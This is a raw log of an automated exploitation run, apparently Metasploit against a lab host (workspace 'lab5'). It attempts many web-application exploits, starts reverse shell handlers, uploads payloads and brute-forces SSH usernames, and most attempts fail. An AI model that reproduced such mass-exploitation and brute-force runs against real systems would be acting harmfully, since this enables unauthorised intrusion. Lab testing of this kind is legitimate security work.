[+] [2016.06.04-09:40:43] Workspace:lab5 Progress:136/775 (17%) [132/770] 10.198.0.1:80 - Wordpress Work The Flow Upload Vulnerability
[*] [2016.06.04-09:40:43] [0132] Started reverse TCP handler on 0.0.0.0:1092
[-] [2016.06.04-09:40:43] [0132] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 302
[+] [2016.06.04-09:40:44] Workspace:lab5 Progress:137/775 (17%) [133/770] 10.198.0.1:8080 - HP Openview connectedNodes.ovpl Remote Command Execution
[-] [2016.06.04-09:40:44] No reverse connect payloads available for exploit/unix/webapp/openview_connectednodes_exec
[-] [2016.06.04-09:40:44] No payloads were compatible with exploit/unix/webapp/openview_connectednodes_exec)
[-] [2016.06.04-09:40:44] [0133] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:44] Workspace:lab5 Progress:138/775 (17%) [134/770] 10.198.0.1:80 - AWStats Totals multisort Remote Command Execution
[-] [2016.06.04-09:40:44] No reverse connect payloads available for exploit/unix/webapp/awstatstotals_multisort
[-] [2016.06.04-09:40:44] No payloads were compatible with exploit/unix/webapp/awstatstotals_multisort)
[-] [2016.06.04-09:40:44] [0134] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:45] Workspace:lab5 Progress:139/775 (17%) [135/770] 10.198.0.1:80 - SePortal SQLi Remote Code Execution
[*] [2016.06.04-09:40:45] [0135] Started reverse TCP handler on 0.0.0.0:1093
[*] [2016.06.04-09:40:45] [0135] Logging in as user [ test ]
[-] [2016.06.04-09:40:45] [0135] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Login was not succesful!
[+] [2016.06.04-09:40:46] Workspace:lab5 Progress:140/775 (18%) [136/770] 10.198.0.1:80 - MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
[*] [2016.06.04-09:40:46] [0136] Started reverse TCP handler on 0.0.0.0:1094
[*] [2016.06.04-09:40:46] [0136] Attempting automatic target detection...
[*] [2016.06.04-09:40:46] [0136] select @@version
[-] [2016.06.04-09:40:46] [0136] Exploit aborted due to failure: no-target: The SQL injection parameter was not specified in the GET path
[+] [2016.06.04-09:40:46] Workspace:lab5 Progress:141/775 (18%) [137/770] 10.198.0.1:8080 - WeBid converter.php Remote PHP Code Injection
[*] [2016.06.04-09:40:46] [0137] Started reverse TCP handler on 0.0.0.0:1095
[*] [2016.06.04-09:40:46] [0137] Injecting the PHP payload
[-] [2016.06.04-09:40:46] [0137] Server returned non-200 status code (404)
[+] [2016.06.04-09:40:49] Workspace:lab5 Progress:142/775 (18%) [138/770] 10.198.0.1:8080 - OpenX banner-edit.php File Upload PHP Code Execution
[+] [2016.06.04-09:40:50] Workspace:lab5 Progress:143/775 (18%) [139/770] 10.198.0.1:80 - phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection
[*] [2016.06.04-09:40:50] [0139] Started reverse TCP handler on 0.0.0.0:1097
[*] [2016.06.04-09:40:50] [0139] Sending request for: /phpscheduleit/
[*] [2016.06.04-09:40:50] [0139] Payload embedded in header: X-KJOBUGIYMPGAPZLHWQ
[-] [2016.06.04-09:40:50] [0139] Server returned a non-200 status code: (302)
[+] [2016.06.04-09:40:53] Workspace:lab5 Progress:144/775 (18%) [140/770] 10.198.0.1:8080 - ColdFusion 8.0.1 Arbitrary File Upload and Execute
[-] [2016.06.04-09:40:53] No reverse connect payloads available for exploit/windows/http/coldfusion_fckeditor
[-] [2016.06.04-09:40:53] No payloads were compatible with exploit/windows/http/coldfusion_fckeditor)
[-] [2016.06.04-09:40:53] [0140] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:40:53] Workspace:lab5 Progress:145/775 (18%) [141/770] 10.198.0.1:80 - Openfire Admin Console Authentication Bypass
[*] [2016.06.04-09:40:53] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:40:54] [0141] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:(Jetty))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:40:54] Workspace:lab5 Progress:146/775 (18%) [142/770] 10.198.0.1:8080 - Oracle VM Server Virtual Server Agent Command Injection
[-] [2016.06.04-09:40:54] No reverse connect payloads available for exploit/unix/webapp/oracle_vm_agent_utl
[-] [2016.06.04-09:40:54] No payloads were compatible with exploit/unix/webapp/oracle_vm_agent_utl)
[+] [2016.06.04-09:40:55] Workspace:lab5 Progress:147/775 (18%) [143/770] 10.198.0.1:8080 - Wordpress Ajax Load More PHP Upload Vulnerability
[+] [2016.06.04-09:40:55] Workspace:lab5 Progress:148/775 (19%) [144/770] 10.198.0.1:8080 - osCommerce 2.2 Arbitrary PHP Code Execution
[*] [2016.06.04-09:40:55] [0144] Started reverse TCP handler on 0.0.0.0:1100
[*] [2016.06.04-09:40:55] [0144] Sending file save request
[-] [2016.06.04-09:40:55] [0144] Server returned non-302 status code (404)
[*] [2016.06.04-09:40:55] [0144] Requesting our payload
[*] [2016.06.04-09:40:55] [0042] 10.198.0.1:22 - Trying username 'avahi'
[+] [2016.06.04-09:40:58] Workspace:lab5 Progress:149/775 (19%) [145/770] 10.198.0.1:80 - PhpMyAdmin Config File Code Injection
[*] [2016.06.04-09:40:58] [0145] Started reverse TCP handler on 0.0.0.0:1101
[*] [2016.06.04-09:40:58] [0145] Grabbing session cookie and CSRF token
[-] [2016.06.04-09:40:58] [0145] Exploit aborted due to failure: not-found: Couldn't find token and can't continue without it. Is URI set correctly?
[+] [2016.06.04-09:40:59] Workspace:lab5 Progress:150/775 (19%) [146/770] 10.198.0.1:8080 - Apache Tomcat Manager Authenticated Upload Code Execution
[*] [2016.06.04-09:40:59] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:40:59] [0146] Started reverse TCP handler on 0.0.0.0:1102
[*] [2016.06.04-09:40:59] [0146] Retrieving session ID and CSRF token...
[-] [2016.06.04-09:40:59] [0146] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
[+] [2016.06.04-09:40:59] Workspace:lab5 Progress:151/775 (19%) [147/770] 10.198.0.1:80 - ContentKeeper Web Remote Command Execution
[-] [2016.06.04-09:40:59] No reverse connect payloads available for exploit/unix/http/contentkeeperweb_mimencode
[-] [2016.06.04-09:40:59] No payloads were compatible with exploit/unix/http/contentkeeperweb_mimencode)
[-] [2016.06.04-09:40:59] [0147] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:00] Workspace:lab5 Progress:152/775 (19%) [148/770] 10.198.0.1:8080 - AjaXplorer checkInstall.php Remote Command Execution
[-] [2016.06.04-09:41:00] No reverse connect payloads available for exploit/multi/http/ajaxplorer_checkinstall_exec
[-] [2016.06.04-09:41:00] No payloads were compatible with exploit/multi/http/ajaxplorer_checkinstall_exec)
[-] [2016.06.04-09:41:00] [0148] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:01] Workspace:lab5 Progress:153/775 (19%) [149/770] 10.198.0.1:80 - Dogfood CRM spell.php Remote Command Execution
[-] [2016.06.04-09:41:01] No reverse connect payloads available for exploit/unix/webapp/dogfood_spell_exec
[-] [2016.06.04-09:41:01] No payloads were compatible with exploit/unix/webapp/dogfood_spell_exec)
[-] [2016.06.04-09:41:01] [0149] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:01] Workspace:lab5 Progress:154/775 (19%) [150/770] 10.198.0.1:80 - Wyse Rapport Hagent Fake Hserver Command Execution
[*] [2016.06.04-09:41:01] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:41:01] [0150] Started reverse TCP handler on 0.0.0.0:1103
[-] [2016.06.04-09:41:02] [0150] 10.198.0.1:80 - This exploit requires the FTP service to run on port 21
[+] [2016.06.04-09:41:02] Workspace:lab5 Progress:155/775 (20%) [151/770] 10.198.0.1:80 - ColdFusion 8.0.1 Arbitrary File Upload and Execute
[-] [2016.06.04-09:41:02] No reverse connect payloads available for exploit/windows/http/coldfusion_fckeditor
[-] [2016.06.04-09:41:02] No payloads were compatible with exploit/windows/http/coldfusion_fckeditor)
[-] [2016.06.04-09:41:02] [0151] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:03] Workspace:lab5 Progress:156/775 (20%) [152/770] 10.198.0.1:8080 - Apache Tomcat Manager Application Deployer Authenticated Code Execution
[*] [2016.06.04-09:41:03] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:41:03] [0152] Started reverse TCP handler on 0.0.0.0:1105
[*] [2016.06.04-09:41:03] [0152] Attempting to automatically select a target...
[-] [2016.06.04-09:41:03] [0152] Failed: Error requesting /manager/serverinfo
[-] [2016.06.04-09:41:03] [0152] Exploit aborted due to failure: no-target: Unable to automatically select a target
[+] [2016.06.04-09:41:03] Workspace:lab5 Progress:157/775 (20%) [153/770] 10.198.0.1:80 - Nagios3 statuswml.cgi Ping Command Execution
[-] [2016.06.04-09:41:03] No reverse connect payloads available for exploit/unix/webapp/nagios3_statuswml_ping
[-] [2016.06.04-09:41:03] No payloads were compatible with exploit/unix/webapp/nagios3_statuswml_ping)
[-] [2016.06.04-09:41:03] [0153] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:04] Workspace:lab5 Progress:158/775 (20%) [154/770] 10.198.0.1:8080 - PAJAX Remote Command Execution
[*] [2016.06.04-09:41:04] [0154] Started reverse TCP handler on 0.0.0.0:1106
[*] [2016.06.04-09:41:04] [0154] 10.198.0.1:8080 - The server returned: 404 Not Found
[+] [2016.06.04-09:41:07] Workspace:lab5 Progress:159/775 (20%) [155/770] 10.198.0.1:8080 - vBulletin misc.php Template Name Arbitrary Code Execution
[-] [2016.06.04-09:41:07] No reverse connect payloads available for exploit/unix/webapp/php_vbulletin_template
[-] [2016.06.04-09:41:07] No payloads were compatible with exploit/unix/webapp/php_vbulletin_template)
[-] [2016.06.04-09:41:07] [0155] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:07] Workspace:lab5 Progress:160/775 (20%) [156/770] 10.198.0.1:80 - DD-WRT HTTP Daemon Arbitrary Command Execution
[-] [2016.06.04-09:41:07] No reverse connect payloads available for exploit/linux/http/ddwrt_cgibin_exec
[-] [2016.06.04-09:41:07] No payloads were compatible with exploit/linux/http/ddwrt_cgibin_exec)
[-] [2016.06.04-09:41:07] [0156] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:08] Workspace:lab5 Progress:161/775 (20%) [157/770] 10.198.0.1:80 - Adobe RoboHelp Server 8 Arbitrary File Upload and Execute
[-] [2016.06.04-09:41:08] No reverse connect payloads available for exploit/windows/http/adobe_robohelper_authbypass
[-] [2016.06.04-09:41:08] No payloads were compatible with exploit/windows/http/adobe_robohelper_authbypass)
[-] [2016.06.04-09:41:08] [0157] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:41:08] [0042] 10.198.0.1:22 - Trying username 'avahi-autoipd'
[+] [2016.06.04-09:41:09] Workspace:lab5 Progress:162/775 (20%) [158/770] 10.198.0.1:8080 - PHP XML-RPC Arbitrary Code Execution
[-] [2016.06.04-09:41:09] No reverse connect payloads available for exploit/unix/webapp/php_xmlrpc_eval
[-] [2016.06.04-09:41:09] No payloads were compatible with exploit/unix/webapp/php_xmlrpc_eval)
[-] [2016.06.04-09:41:09] [0158] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:09] Workspace:lab5 Progress:163/775 (21%) [159/770] 10.198.0.1:80 - osCommerce 2.2 Arbitrary PHP Code Execution
[*] [2016.06.04-09:41:09] [0159] Started reverse TCP handler on 0.0.0.0:1107
[*] [2016.06.04-09:41:09] [0159] Sending file save request
[*] [2016.06.04-09:41:09] [0159] Requesting our payload
[+] [2016.06.04-09:41:12] Workspace:lab5 Progress:164/775 (21%) [160/770] 10.198.0.1:8080 - phpBB viewtopic.php Arbitrary Code Execution
[-] [2016.06.04-09:41:12] No reverse connect payloads available for exploit/unix/webapp/phpbb_highlight
[-] [2016.06.04-09:41:12] No payloads were compatible with exploit/unix/webapp/phpbb_highlight)
[-] [2016.06.04-09:41:12] [0160] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:13] Workspace:lab5 Progress:165/775 (21%) [161/770] 10.198.0.1:8080 - Axis2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)
[*] [2016.06.04-09:41:13] [0161] Started reverse TCP handler on 0.0.0.0:1108
[-] [2016.06.04-09:41:13] [0161] http://10.198.0.1:8080/axis2/axis2-admin returned code 404
[-] [2016.06.04-09:41:13] [0161] http://10.198.0.1:8080/dswsbobje/axis2-admin returned code 404
[-] [2016.06.04-09:41:13] [0161] http://10.198.0.1:8080/dswsbobje/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] failed to login as 'admin'
[+] [2016.06.04-09:41:16] Workspace:lab5 Progress:166/775 (21%) [162/770] 10.198.0.1:8080 - CMS Bolt File Upload Vulnerability
[+] [2016.06.04-09:41:16] Workspace:lab5 Progress:167/775 (21%) [163/770] 10.198.0.1:8080 - China Chopper Caidao PHP Backdoor Code Execution
[*] [2016.06.04-09:41:17] [0163] Started reverse TCP handler on 0.0.0.0:1110
[*] [2016.06.04-09:41:17] [0163] Sending exploit...
[+] [2016.06.04-09:41:19] Workspace:lab5 Progress:168/775 (21%) [164/770] 10.198.0.1:80 - Apache Tomcat Manager Authenticated Upload Code Execution
[*] [2016.06.04-09:41:19] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:41:19] [0164] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache.*(Coyote|Tomcat))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:19] Workspace:lab5 Progress:169/775 (21%) [165/770] 10.198.0.1:80 - Apache Tomcat Manager Application Deployer Authenticated Code Execution
[*] [2016.06.04-09:41:19] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:41:20] [0165] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache.*(Coyote|Tomcat))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:20] Workspace:lab5 Progress:170/775 (21%) [166/770] 10.198.0.1:8080 - Adobe RoboHelp Server 8 Arbitrary File Upload and Execute
[-] [2016.06.04-09:41:20] No reverse connect payloads available for exploit/windows/http/adobe_robohelper_authbypass
[-] [2016.06.04-09:41:20] No payloads were compatible with exploit/windows/http/adobe_robohelper_authbypass)
[-] [2016.06.04-09:41:20] [0166] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:21] Workspace:lab5 Progress:171/775 (22%) [167/770] 10.198.0.1:8080 - ZeroShell Remote Code Execution
[*] [2016.06.04-09:41:21] [0042] 10.198.0.1:22 - Trying username 'backup'
[*] [2016.06.04-09:41:21] [0167] Started reverse TCP handler on 0.0.0.0:1113
[*] [2016.06.04-09:41:21] [0167] Retrieving cleartext admin password
[-] [2016.06.04-09:41:21] [0167] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Retrieving password failed!
[+] [2016.06.04-09:41:21] Workspace:lab5 Progress:172/775 (22%) [168/770] 10.198.0.1:80 - OpenX banner-edit.php File Upload PHP Code Execution
[+] [2016.06.04-09:41:22] Workspace:lab5 Progress:173/775 (22%) [169/770] 10.198.0.1:8080 - Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload
[*] [2016.06.04-09:41:22] [0169] Started reverse TCP handler on 0.0.0.0:1115
[*] [2016.06.04-09:41:22] [0169] Uploading payload to /wp-content/uploads/wysija/themes/DdgNTExSGx/XPhKgZmPlO.php
[-] [2016.06.04-09:41:22] [0169] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Upload failed
[+] [2016.06.04-09:41:23] Workspace:lab5 Progress:174/775 (22%) [170/770] 10.198.0.1:80 - Novell ZENworks Configuration Management Remote Execution
[*] [2016.06.04-09:41:23] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:41:23] [0170] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache-Coyote)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:23] Workspace:lab5 Progress:175/775 (22%) [171/770] 10.198.0.1:80 - AjaXplorer checkInstall.php Remote Command Execution
[-] [2016.06.04-09:41:23] No reverse connect payloads available for exploit/multi/http/ajaxplorer_checkinstall_exec
[-] [2016.06.04-09:41:23] No payloads were compatible with exploit/multi/http/ajaxplorer_checkinstall_exec)
[-] [2016.06.04-09:41:23] [0171] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:24] Workspace:lab5 Progress:176/775 (22%) [172/770] 10.198.0.1:80 - Axis2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)
[-] [2016.06.04-09:41:24] [0172] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache.*(Coyote|Tomcat)|Jetty.*)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:24] Workspace:lab5 Progress:177/775 (22%) [173/770] 10.198.0.1:80 - JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
[-] [2016.06.04-09:41:24] [0173] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:(Jetty|JBoss))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:25] Workspace:lab5 Progress:178/775 (22%) [174/770] 10.198.0.1:8080 - Wordpress WPTouch Authenticated File Upload
[+] [2016.06.04-09:41:26] Workspace:lab5 Progress:179/775 (23%) [175/770] 10.198.0.1:80 - JBoss Java Class DeploymentFileRepository WAR Deployment
[-] [2016.06.04-09:41:26] [0175] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:(Jetty|JBoss))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:26] Workspace:lab5 Progress:180/775 (23%) [176/770] 10.198.0.1:8080 - Dexter (CasinoLoader) SQL Injection
[*] [2016.06.04-09:41:26] [0176] Started reverse TCP handler on 0.0.0.0:1121
[*] [2016.06.04-09:41:26] [0176] Using SQL injection to acquire credentials
[-] [2016.06.04-09:41:26] [0176] Failed to acquire administrator username
[+] [2016.06.04-09:41:29] Workspace:lab5 Progress:181/775 (23%) [177/770] 10.198.0.1:8080 - PhpMyAdmin Config File Code Injection
[*] [2016.06.04-09:41:29] [0177] Started reverse TCP handler on 0.0.0.0:1122
[*] [2016.06.04-09:41:29] [0177] Grabbing session cookie and CSRF token
[-] [2016.06.04-09:41:29] [0177] Exploit aborted due to failure: not-found: Couldn't find token and can't continue without it. Is URI set correctly?
[+] [2016.06.04-09:41:30] Workspace:lab5 Progress:182/775 (23%) [178/770] 10.198.0.1:8080 - ProjectSend Arbitrary File Upload
[*] [2016.06.04-09:41:30] [0178] Started reverse TCP handler on 0.0.0.0:1123
[*] [2016.06.04-09:41:30] [0178] Uploading file 'eTgCZskhqRFIp.php' (1294 bytes)
[-] [2016.06.04-09:41:30] [0178] Exploit aborted due to failure: not-found: 10.198.0.1:8080 - No process-upload.php found
[+] [2016.06.04-09:41:30] Workspace:lab5 Progress:183/775 (23%) [179/770] 10.198.0.1:80 - Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability
[*] [2016.06.04-09:41:30] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:41:31] [0179] Started reverse TCP handler on 0.0.0.0:1124
[*] [2016.06.04-09:41:31] [0179] Sending request to 10.198.0.1:80
[-] [2016.06.04-09:41:32] [0179] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-09:41:32] Workspace:lab5 Progress:184/775 (23%) [180/770] 10.198.0.1:8080 - WordPress WPshop eCommerce Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:41:32] [0180] Started reverse TCP handler on 0.0.0.0:1125
[-] [2016.06.04-09:41:32] [0180] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-09:41:32] Workspace:lab5 Progress:185/775 (23%) [181/770] 10.198.0.1:80 - Snortreport nmap.php/nbtscan.php Remote Command Execution
[-] [2016.06.04-09:41:32] No reverse connect payloads available for exploit/multi/http/snortreport_exec
[-] [2016.06.04-09:41:32] No payloads were compatible with exploit/multi/http/snortreport_exec)
[-] [2016.06.04-09:41:32] [0181] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:41:33] Workspace:lab5 Progress:186/775 (24%) [182/770] 10.198.0.1:80 - Novell iManager getMultiPartParameters Arbitrary File Upload
[-] [2016.06.04-09:41:33] No reverse connect payloads available for exploit/windows/http/novell_imanager_upload
[-] [2016.06.04-09:41:33] No payloads were compatible with exploit/windows/http/novell_imanager_upload)
[-] [2016.06.04-09:41:33] [0182] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:41:33] [0042] 10.198.0.1:22 - Trying username 'bbs'
[+] [2016.06.04-09:41:34] Workspace:lab5 Progress:187/775 (24%) [183/770] 10.198.0.1:80 - Oracle VM Server Virtual Server Agent Command Injection
[-] [2016.06.04-09:41:34] No reverse connect payloads available for exploit/unix/webapp/oracle_vm_agent_utl
[-] [2016.06.04-09:41:34] No payloads were compatible with exploit/unix/webapp/oracle_vm_agent_utl)
[+] [2016.06.04-09:41:34] Workspace:lab5 Progress:188/775 (24%) [184/770] 10.198.0.1:8080 - Wordpress Work The Flow Upload Vulnerability
[*] [2016.06.04-09:41:34] [0184] Started reverse TCP handler on 0.0.0.0:1126
[-] [2016.06.04-09:41:34] [0184] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-09:41:35] Workspace:lab5 Progress:189/775 (24%) [185/770] 10.198.0.1:80 - Oracle Database Client System Analyzer Arbitrary File Upload
[*] [2016.06.04-09:41:35] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:41:35] [0185] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Oracle Containers for J2EE)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:41:35] Workspace:lab5 Progress:190/775 (24%) [186/770] 10.198.0.1:80 - MS10-104 Microsoft Office SharePoint Server 2007 Remote Code Execution
[*] [2016.06.04-09:41:35] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:41:36] [0186] Started reverse TCP handler on 0.0.0.0:1128
[*] [2016.06.04-09:41:37] [0186] Sending HTTP ConvertFile Request to upload the exe payload pOlmZIqDr.exe
[-] [2016.06.04-09:41:37] [0186] Failed to upload pOlmZIqDr.exe
[*] [2016.06.04-09:41:46] [0042] 10.198.0.1:22 - Trying username 'bin'
[*] [2016.06.04-09:41:59] [0042] 10.198.0.1:22 - Trying username 'checkfs'
[*] [2016.06.04-09:42:12] [0042] 10.198.0.1:22 - Trying username 'checkfsys'
[*] [2016.06.04-09:42:24] [0042] 10.198.0.1:22 - Trying username 'checksys'
[*] [2016.06.04-09:42:37] [0042] 10.198.0.1:22 - Trying username 'cmwlogin'
[*] [2016.06.04-09:42:50] [0042] 10.198.0.1:22 - Trying username 'couchdb'
[*] [2016.06.04-09:43:02] [0042] 10.198.0.1:22 - Trying username 'daemon'
[*] [2016.06.04-09:43:14] [0042] 10.198.0.1:22 - Trying username 'dbadmin'
[*] [2016.06.04-09:43:27] [0042] 10.198.0.1:22 - Trying username 'demo'
[*] [2016.06.04-09:43:40] [0042] 10.198.0.1:22 - Trying username 'demos'
[*] [2016.06.04-09:43:55] [0042] 10.198.0.1:22 - Trying username 'diag'
[+] [2016.06.04-09:43:59] Workspace:lab5 Progress:191/775 (24%) [187/770] 10.198.0.1:80 - Pandora FMS v3.1 Auth Bypass and Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:44:00] [0187] Started reverse TCP handler on 0.0.0.0:1129
[*] [2016.06.04-09:44:00] [0187] Uploading PHP payload (946 bytes)
[-] [2016.06.04-09:44:00] [0187] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Uploading PHP payload failed
[!] [2016.06.04-09:44:00] [0187] This exploit may require manual cleanup of '3875670.php' on the target
[+] [2016.06.04-09:44:00] Workspace:lab5 Progress:192/775 (24%) [188/770] 10.198.0.1:80 - CakePHP Cache Corruption Code Execution
[*] [2016.06.04-09:44:00] [0188] Started reverse TCP handler on 0.0.0.0:1130
[*] [2016.06.04-09:44:00] [0188] Sending exploit request 1
[*] [2016.06.04-09:44:00] [0188] Sending exploit request 2
[*] [2016.06.04-09:44:00] [0188] Requesting our payload
[+] [2016.06.04-09:44:01] Workspace:lab5 Progress:193/775 (24%) [189/770] 10.198.0.1:80 - Mitel Audio and Web Conferencing Command Injection
[-] [2016.06.04-09:44:01] No reverse connect payloads available for exploit/unix/webapp/mitel_awc_exec
[-] [2016.06.04-09:44:01] No payloads were compatible with exploit/unix/webapp/mitel_awc_exec)
[-] [2016.06.04-09:44:01] [0189] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:01] Workspace:lab5 Progress:194/775 (25%) [190/770] 10.198.0.1:80 - Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability
[*] [2016.06.04-09:44:01] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:01] [0190] Started reverse TCP handler on 0.0.0.0:1131
[-] [2016.06.04-09:44:02] [0190] Exploit aborted due to failure: not-vulnerable: Target does not appear to be Oracle BeeHive
[+] [2016.06.04-09:44:02] Workspace:lab5 Progress:195/775 (25%) [191/770] 10.198.0.1:80 - Citrix Access Gateway Command Execution
[-] [2016.06.04-09:44:02] No reverse connect payloads available for exploit/unix/webapp/citrix_access_gateway_exec
[-] [2016.06.04-09:44:02] No payloads were compatible with exploit/unix/webapp/citrix_access_gateway_exec)
[-] [2016.06.04-09:44:02] [0191] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:02] Workspace:lab5 Progress:196/775 (25%) [192/770] 10.198.0.1:8080 - Spreecommerce Arbitrary Command Execution
[-] [2016.06.04-09:44:02] No reverse connect payloads available for exploit/multi/http/spree_searchlogic_exec
[-] [2016.06.04-09:44:02] No payloads were compatible with exploit/multi/http/spree_searchlogic_exec)
[-] [2016.06.04-09:44:02] [0192] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:03] Workspace:lab5 Progress:197/775 (25%) [193/770] 10.198.0.1:8080 - QuickTime Streaming Server parse_xml.cgi Remote Execution
[-] [2016.06.04-09:44:03] No reverse connect payloads available for exploit/unix/webapp/qtss_parse_xml_exec
[-] [2016.06.04-09:44:03] No payloads were compatible with exploit/unix/webapp/qtss_parse_xml_exec)
[-] [2016.06.04-09:44:03] [0193] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:03] Workspace:lab5 Progress:198/775 (25%) [194/770] 10.198.0.1:8080 - GestioIP Remote Command Execution
[-] [2016.06.04-09:44:03] No reverse connect payloads available for exploit/multi/http/gestioip_exec
[-] [2016.06.04-09:44:03] No payloads were compatible with exploit/multi/http/gestioip_exec)
[-] [2016.06.04-09:44:03] [0194] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:04] Workspace:lab5 Progress:199/775 (25%) [195/770] 10.198.0.1:80 - HP OpenView Performance Insight Server Backdoor Account Code Execution
[-] [2016.06.04-09:44:04] No reverse connect payloads available for exploit/windows/http/hp_openview_insight_backdoor
[-] [2016.06.04-09:44:04] No payloads were compatible with exploit/windows/http/hp_openview_insight_backdoor)
[-] [2016.06.04-09:44:04] [0195] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:04] Workspace:lab5 Progress:200/775 (25%) [196/770] 10.198.0.1:80 - Spreecommerce Arbitrary Command Execution
[-] [2016.06.04-09:44:04] No reverse connect payloads available for exploit/multi/http/spree_searchlogic_exec
[-] [2016.06.04-09:44:04] No payloads were compatible with exploit/multi/http/spree_searchlogic_exec)
[-] [2016.06.04-09:44:04] [0196] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:04] Workspace:lab5 Progress:201/775 (25%) [197/770] 10.198.0.1:8080 - SolarWinds Storage Manager Authentication Bypass
[-] [2016.06.04-09:44:04] No reverse connect payloads available for exploit/multi/http/solarwinds_store_manager_auth_filter
[-] [2016.06.04-09:44:04] No payloads were compatible with exploit/multi/http/solarwinds_store_manager_auth_filter)
[-] [2016.06.04-09:44:04] [0197] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:05] Workspace:lab5 Progress:202/775 (26%) [198/770] 10.198.0.1:80 - Sun/Oracle GlassFish Server Authenticated Code Execution
[*] [2016.06.04-09:44:05] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:05] [0198] Started reverse TCP handler on 0.0.0.0:1132
[+] [2016.06.04-09:44:05] Workspace:lab5 Progress:203/775 (26%) [199/770] 10.198.0.1:8080 - Snortreport nmap.php/nbtscan.php Remote Command Execution
[-] [2016.06.04-09:44:05] No reverse connect payloads available for exploit/multi/http/snortreport_exec
